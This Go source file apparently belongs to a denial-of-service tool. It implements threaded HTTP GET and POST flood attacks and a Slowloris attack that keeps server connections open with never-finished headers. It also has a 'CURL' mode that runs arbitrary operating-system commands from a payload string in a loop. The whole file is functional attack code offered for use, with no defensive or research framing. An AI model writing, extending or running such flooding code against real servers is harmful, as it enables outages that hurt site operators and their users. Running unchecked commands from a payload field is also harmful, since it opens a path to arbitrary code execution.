// http.go
package attack

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// HTTP defines the configuration and statistics for an HTTP attack
type HTTP struct {
	Method  string            // Attack method: GET, POST
	Target  string            // Target URL
	Path    string            // Optional path
	Threads int               // Number of attack threads
	Header  map[string]string // Additional request headers
	Payload string            // POST request payload, can also be used for OS commands

	// Statistics fields
	sentRequests  int64
	recvResponses int64
	sentBytes     int64
	recvBytes     int64
	connErrors    int64
	startTime     time.Time
}

// HTTPStart starts the HTTP attack
func (h *HTTP) HTTPStart() {
	// Initialization
	h.startTime = time.Now()

	// Initialize bandwidth limiter
	InitBandwidthLimiter()

	fmt.Printf("[+] Starting %s attack on target: %s\n", h.Method, h.Target)
	fmt.Printf("[+] Number of threads: %d\n", h.Threads)
	if len(h.Header) > 0 {
		fmt.Println("[+] Using custom request headers")
	}

	// Select attack method based on Method
	switch h.Method {
	case "GET":
		h.floodAttack(h.httpGet)
	case "POST":
		h.floodAttack(h.httpPost)
	case "CURL":
		h.floodAttack(h.curl)
	case "SLOWLORIS":
		h.floodAttack(h.Slowloris)
	default:
		fmt.Printf("Unsupported HTTP attack method: %s\n", h.Method)
		return
	}

	h.printSummary()
}

// Attack function type
type attackFunc func() error

// floodAttack performs a flood attack
func (h *HTTP) floodAttack(attackVector attackFunc) {
	var wg sync.WaitGroup

	// Create an error channel for aggregating error reports
	errorChan := make(chan error, h.Threads)

	// Start an error monitoring goroutine
	go func() {
		for err := range errorChan {
			atomic.AddInt64(&h.connErrors, 1)
			// Error logging strategy: log every 50 errors, but ensure the first error is logged
			if h.connErrors <= 1 || h.connErrors%50 == 0 {
				fmt.Printf("HTTP attack error: %v (Error count: %d)\n", err, h.connErrors)
			}
		}
	}()

	for i := 0; i < h.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				select {
				case <-STOP:
					fmt.Printf("Thread %d: HTTP attack terminated\n", id)
					return
				default:
					// Apply bandwidth limiting - estimate request size
					if bandwidthLimiter != nil {
						// Estimate request size (based on headers and payload)
						reqSize := 300 // Base request size estimate (adjust as needed)
						if h.Method == "POST" {
							reqSize += len(h.Payload)
						}

						// Wait for sufficient bandwidth tokens
						if err := bandwidthLimiter.WaitN(context.Background(), reqSize); err != nil {
							errorChan <- fmt.Errorf("Bandwidth limit wait failed: %v", err)
							time.Sleep(100 * time.Millisecond) // Add a simple fallback strategy
							continue
						}
					}

					if err := attackVector(); err != nil {
						errorChan <- err
						// Add a simple exponential backoff strategy
						backoff := time.Duration(50*(atomic.LoadInt64(&h.connErrors)%20)) * time.Millisecond
						if backoff > 2*time.Second {
							backoff = 2 * time.Second // Maximum backoff time
						}
						time.Sleep(backoff)
					}
				}
			}
		}(i)
	}

	wg.Wait()
	close(errorChan) // Close the error channel
}

// httpGet performs a GET request attack - non-blocking response version
func (h *HTTP) httpGet() error {
	client := h.newClient()

	// Build request target
	reqTarget := h.Target
	if h.Path != "" {
		parsedURL, err := url.Parse(h.Target)
		if err == nil {
			parsedURL.Path = h.Path
			reqTarget = parsedURL.String()
		}
	}

	req, err := http.NewRequest("GET", reqTarget, nil)
	if err != nil {
		return fmt.Errorf("Failed to create GET request: %v", err)
	}

	// Add request headers
	h.addHeaders(req)

	// Record sent request
	atomic.AddInt64(&h.sentRequests, 1)
	reqSize := estimateRequestSize(req)
	atomic.AddInt64(&h.sentBytes, int64(reqSize))

	// Use a goroutine to asynchronously send the request and handle the response
	go func() {
		resp, err := client.Do(req)
		if err != nil {
			// Ignore errors, do not interrupt the main flow
			return
		}

		// Record received response
		atomic.AddInt64(&h.recvResponses, 1)

		// Asynchronously read and discard the response body, but record its size
		go func() {
			defer resp.Body.Close()
			n, err := io.Copy(io.Discard, resp.Body)
			// Ignore read errors
			_ = err
			atomic.AddInt64(&h.recvBytes, n)
		}()
	}()

	return nil
}

// httpPost performs a POST request attack - non-blocking response version
func (h *HTTP) httpPost() error {
	client := h.newClient()

	// Build request target
	reqTarget := h.Target
	if h.Path != "" {
		parsedURL, err := url.Parse(h.Target)
		if err == nil {
			parsedURL.Path = h.Path
			reqTarget = parsedURL.String()
		}
	}

	// Create request body
	body := strings.NewReader(h.Payload)
	req, err := http.NewRequest("POST", reqTarget, body)
	if err != nil {
		return fmt.Errorf("Failed to create POST request: %v", err)
	}

	// Add request headers
	h.addHeaders(req)

	// Ensure content type is correctly set (if not specified in custom headers)
	if _, hasContentType := req.Header["Content-Type"]; !hasContentType {
		// Attempt to guess content type based on payload
		if strings.HasPrefix(h.Payload, "{") || strings.HasPrefix(h.Payload, "[") {
			req.Header.Set("Content-Type", "application/json")
		} else if strings.Contains(h.Payload, "&") && strings.Contains(h.Payload, "=") {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req.Header.Set("Content-Type", "text/plain")
		}
	}

	// Record sent request
	atomic.AddInt64(&h.sentRequests, 1)
	reqSize := estimateRequestSize(req) + len(h.Payload)
	atomic.AddInt64(&h.sentBytes, int64(reqSize))

	// Use a goroutine to asynchronously send the request and handle the response
	go func() {
		resp, err := client.Do(req)
		if err != nil {
			// Ignore errors, do not interrupt the main flow
			return
		}

		// Record received response
		atomic.AddInt64(&h.recvResponses, 1)

		// Asynchronously read and discard the response body, but record its size
		go func() {
			defer resp.Body.Close()
			n, err := io.Copy(io.Discard, resp.Body)
			// Ignore read errors
			_ = err
			atomic.AddInt64(&h.recvBytes, n)
		}()
	}()

	return nil
}

// curl executes a command, leveraging curl's rate-limiting mechanism
func (h *HTTP) curl() error {
	args := strings.Fields(h.Payload)
	if len(args) == 0 {
		return fmt.Errorf("empty payload")
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		select {
		case <-STOP:
			cancel() // Cancel context on termination signal
		case <-ctx.Done():
			return
		}
	}()

	cmd := exec.CommandContext(ctx, args[0], args[1:]...) // Bind context
	_ = cmd.Run()                                         // Ignore errors
	return nil
}

// Slowloris uses a slow attack strategy
func (h *HTTP) Slowloris() error {
	// 构建请求目标
	reqTarget := h.Target
	if h.Path != "" {
		parsedURL, err := url.Parse(h.Target)
		if err == nil {
			parsedURL.Path = h.Path
			reqTarget = parsedURL.String()
		}
	}

	// 创建 TCP 连接而不是使用 http.Client
	// 以便控制发送数据的时机
	parsedURL, err := url.Parse(reqTarget)
	if err != nil {
		return fmt.Errorf("解析 URL 失败: %v", err)
	}

	// 确定主机和端口
	host := parsedURL.Host
	if !strings.Contains(host, ":") {
		if parsedURL.Scheme == "https" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}

	// 建立 TCP 连接
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return fmt.Errorf("建立连接失败: %v", err)
	}
	defer conn.Close()

	// 记录已发送的请求
	atomic.AddInt64(&h.sentRequests, 1)

	// 发送初始不完整的 HTTP 请求
	initialReq := fmt.Sprintf("GET %s HTTP/1.1\r\n", parsedURL.Path)
	initialReq += fmt.Sprintf("Host: %s\r\n", parsedURL.Hostname())
	initialReq += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"

	// 添加来自 h.Header 的任何自定义头
	for k, v := range h.Header {
		initialReq += fmt.Sprintf("%s: %s\r\n", k, v)
	}

	// 发送初始头信息但不完成请求
	_, err = conn.Write([]byte(initialReq))
	if err != nil {
		return fmt.Errorf("发送初始头信息失败: %v", err)
	}

	// 记录发送的字节数
	sentBytes := len(initialReq)
	atomic.AddInt64(&h.sentBytes, int64(sentBytes))

	// 通过定期发送额外的头信息来保持连接活动
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-STOP:
			return nil
		case <-ticker.C:
			// 发送额外的头信息以保持连接活动
			// 但永远不完成请求
			additionalHeader := fmt.Sprintf("X-a: %d\r\n", time.Now().UnixNano())
			_, err := conn.Write([]byte(additionalHeader))
			if err != nil {
				// 连接可能被服务器关闭
				return fmt.Errorf("连接被服务器关闭: %v", err)
			}
			atomic.AddInt64(&h.sentBytes, int64(len(additionalHeader)))
		}
	}
}
